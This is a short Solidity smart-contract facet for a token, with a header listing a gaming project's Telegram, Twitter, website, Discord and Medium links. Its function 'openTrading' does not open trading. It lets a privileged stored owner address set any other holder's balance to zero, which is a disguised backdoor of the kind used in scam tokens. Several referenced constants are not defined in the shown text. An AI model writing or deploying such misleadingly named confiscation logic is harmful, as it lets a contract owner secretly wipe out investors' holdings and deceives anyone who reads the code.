/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/paramgaming
    // Twitter: https://twitter.com/paramlaboratory
    // Website: https://paramgaming.com/
    // Discord: https://discord.com/invite/kiraverse
    // Medium:  https://paramgaming.medium.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
